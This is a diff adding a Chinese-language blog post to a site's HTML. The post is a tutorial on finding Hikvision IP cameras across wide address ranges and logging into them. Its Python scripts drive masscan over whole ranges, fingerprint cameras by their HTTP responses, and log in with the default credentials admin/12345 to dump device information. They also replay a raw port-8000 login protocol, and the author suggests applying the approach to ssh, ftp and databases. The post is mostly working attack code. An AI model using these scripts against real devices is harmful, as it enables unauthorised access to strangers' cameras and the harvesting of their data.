@@ -224,6 +224,155 @@
             
               
                 
+                <a class="post-title-link" href="/python/2015/04/07/python-spider-camera-find/" itemprop="url">
+                  Python Spider: 海康威视摄像头发现
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2015-04-07T00:00:00+08:00" content="2015-04-07">
+              2015-04-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/python/2015/04/07/python-spider-camera-find/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/07/python-spider-camera-find/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <h2 id="Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)">Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</h2><blockquote>
+<p>一切都在不可避免的走向庸俗</p>
+<p>王小波</p>
+</blockquote>
+<p>挖坟= =and 最后一个爬虫。</p>
+<p>缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =</p>
+<p>警告：你所做的一切都是有迹可寻的，dont be evil。</p>
+<p>我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。</p>
+<p>顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.</p>
+<p>大概这么几步：</p>
+<ol>
+<li>用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的</li>
+<li>对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。</li>
+<li>找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子</li>
+<li>批量获取弱密码摄像头</li>
+</ol>
+<p>首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">masscan</a>，因为他比我自己写的扫描器比<a href="https://zmap.io" target="_blank" rel="external">zmap</a>、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">扫描指定端口</span><br><span class="line">usage:</span><br><span class="line">    python scan_port.py net interface port</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.makedirs(<span class="string">'data/open_port/'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.mkdir(<span class="string">'dump'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 扫描网段内80端口, 生成列表</span></span><br><span class="line">cmd = <span class="string">"sudo masscan -i"</span> + sys.argv[<span class="number">2</span>] + \</span><br><span class="line">    <span class="string">" -p "</span> + sys.argv[<span class="number">3</span>] + <span class="string">" --rate 100000 --wait 2 -oL data/open_port/open"</span> + \</span><br><span class="line">    sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp "</span> + \</span><br><span class="line">    sys.argv[<span class="number">1</span>] + <span class="string">" &amp;&amp;\</span><br><span class="line">    cut -f4 -d' ' data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + \</span><br><span class="line">    <span class="string">"_ip.temp &gt; data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.list &amp;&amp;\</span><br><span class="line">    rm -f data/open_port/open"</span> + sys.argv[<span class="number">3</span>] + <span class="string">"_ip.temp"</span></span><br><span class="line"><span class="keyword">print</span> cmd</span><br><span class="line"><span class="comment"># cmd = "sudo zmap -i " + sys.argv[2]  + \</span></span><br><span class="line"><span class="comment">#    " -p " + sys.argv[3] + " -o open" + sys.argv[3] + \</span></span><br><span class="line"><span class="comment">#    "_ip.list " + sys.argv[1]</span></span><br><span class="line"></span><br><span class="line">(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-<span class="number">1</span>, mode=<span class="string">'t'</span>)</span><br><span class="line"><span class="comment"># 打印输出</span></span><br><span class="line">sys.stdout.write(child_stdout.read())</span><br></pre></td></tr></table></figure>
+<p>是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)</p>
+<p>速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的<a href="http://eloquentjavascript.net/09_regexp.html" target="_blank" rel="external">eloquent javascript</a>，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有<a href="https://yakuake.kde.org" target="_blank" rel="external">yakuake</a>会有~^_^~</p>
+<p><img src="/images/spider/net_scan_1.png" alt=""></p>
+<p>我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。<a href="https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&amp;q=HTTP%2FGET+" target="_blank" rel="external">其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取server dict</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">20</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/open_port/open80_ip.list'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ips = f.readlines()</span><br><span class="line"></span><br><span class="line">ips = [ip.strip() <span class="keyword">for</span> ip <span class="keyword">in</span> ips]</span><br><span class="line"><span class="comment"># 移除开头和结尾的无关信息</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ips.remove(<span class="string">'#masscan'</span>)</span><br><span class="line">    <span class="comment"># ips.remove('# end')</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ips.remove(<span class="string">'saddr'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ips.remove(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># 保存80端口响应</span></span><br><span class="line">server_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_service</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test"</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip,</span><br><span class="line">                  verify=<span class="keyword">False</span>,</span><br><span class="line">                  allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">                  timeout=<span class="number">20</span>)</span><br><span class="line">        server_dict[ip] = r</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">30</span>)</span><br><span class="line">pool.join(timeout=<span class="number">20</span>)</span><br><span class="line">pool.map(check_service, ips)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Dumping port-80 response..."</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(server_dict, f)</span><br></pre></td></tr></table></figure>
+<p>好吧，monkey_patch,gevent这点非常适合这种quick&amp;dirty的脏活累活，就像我常做的事情。。。</p>
+<p><img src="/images/spider/net_scan_2.png" alt=""></p>
+<p>gevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说…</p>
+<p>总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。</p>
+<p>另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。</p>
+<p>接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。</p>
+<p><img src="/images/spider/net_scan_3.png" alt=""></p>
+<p>我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span></p>
+<p>对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧</p>
+<p>这种默认用户名密码上网一搜就搜到了= =</p>
+<p><img src="/images/spider/net_scan_4.png" alt=""></p>
+<p><img src="/images/spider/net_scan_5.png" alt=""></p>
+<p>同理，我们可以找到设备信息的地址。万事具备，只剩代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取摄像头信息框架</span><br><span class="line">输入：</span><br><span class="line">- 特征字符串</span><br><span class="line">- 获取信息方法。同步/异步</span><br><span class="line">输出：</span><br><span class="line">编号文件camera_num</span><br><span class="line">id:name:username:password</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"><span class="comment"># Hikvision: 可登录验证</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_1 = &#123;&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'doc/page/login.asp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line">        t_1[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第一种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.auth = (<span class="string">'admin'</span>, <span class="string">'12345'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/PSIA/System/deviceInfo'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.ok:</span><br><span class="line">            t_1[ip] = r.content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/ISAPI/System/deviceInfo'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.ok:</span><br><span class="line">                t_1[ip] = r.content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_1[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">300</span>)</span><br><span class="line">pool.join(timeout=<span class="number">100</span>)</span><br><span class="line">pool.map(device_info, [ip <span class="keyword">for</span> ip <span class="keyword">in</span> t_1.keys()])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 1 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_1, f)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/spider/net_scan_6.png" alt=""></p>
+<p>获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。</p>
+<p>另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">t_2</span><br><span class="line">OCX</span><br><span class="line">"""</span></span><br><span class="line"><span class="comment"># <span class="doctag">FIXME:</span> 经常失败？</span></span><br><span class="line"><span class="comment"># 目前想法是控制timeout</span></span><br><span class="line"><span class="comment"># 多次请求后成功率变高？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find IP Camera Type 2"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:(ObjectX, check disabled)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'NetOCX'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        t_2[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第二种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test "</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">        s.send(<span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        login_rt = <span class="string">"\x00\x00\x00L'\x00\x00\x00\x00\x00\x00'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">if</span> data != login_rt:</span><br><span class="line">            t_2[ip] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 首先是个seq</span></span><br><span class="line">            <span class="comment"># 可能无效包，但测试必须有后面才正常</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">                seq_req = <span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00z\xdaf\x00\x8d\x16\xd2~\x9dU\x05\xf1\x1fi\xbb\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xd0\xa2|\xa6v\xbd\xf3\x1eO\xd1\xcb\xdc\xae\xcbd"</span></span><br><span class="line">                s.send(seq_req)</span><br><span class="line">                seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">del</span> seq_ret</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="comment"># 然后是name_seq</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            name_seq_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(name_seq_req)</span><br><span class="line">            name_seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "name_seq_ret: ", name_seq_ret</span></span><br><span class="line">            s.close()</span><br><span class="line">            <span class="comment"># 其次是chanel</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            chanel_req = <span class="string">"\x00\x00\x00$Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x022\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00\x00\x00\x00\x01"</span></span><br><span class="line">            s.send(chanel_req)</span><br><span class="line">            chanel_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "Chanle_ret: ", chanel_ret</span></span><br><span class="line">            <span class="comment"># 再来解析mac地址</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            mac_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(mac_req)</span><br><span class="line">            mac_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            t_2[ip] = &#123;<span class="string">'chanel'</span>: chanel_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>).decode(<span class="string">'gbk'</span>),</span><br><span class="line">                       <span class="string">'server_name'</span>: name_seq_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'seqnum'</span>: name_seq_ret[<span class="number">60</span>:<span class="number">100</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'mac'</span>: <span class="string">"%02x:%02x:%02x:%02x:%02x:%02x:"</span> % struct.unpack(<span class="string">'BBBBBB'</span>, mac_ret[<span class="number">36</span>:<span class="number">42</span>])&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_2[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> t_2.keys():</span><br><span class="line">    device_info(ip)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 2 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_2.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_2, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> t_2.iteritems():</span><br><span class="line">    <span class="keyword">if</span> v == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">print</span> k, <span class="string">': login failed'</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> k, <span class="string">': Ok, info dumped.'</span></span><br></pre></td></tr></table></figure>
+<p>根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，</p>
+<p>大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面</p>
+<p><img src="/images/spider/net_scan_7.png" alt=""></p>
+<p>第一次做效率奇低，特别在加上不同的中文编码</p>
+<p><img src="/images/spider/net_scan_8.png" alt=""></p>
+<p>第二次好多了，如果以后有空再说吧</p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/python/2015/04/05/yingxin/" itemprop="url">
                   Python Spider: 迎新系统学生信息爬取
                 </a>
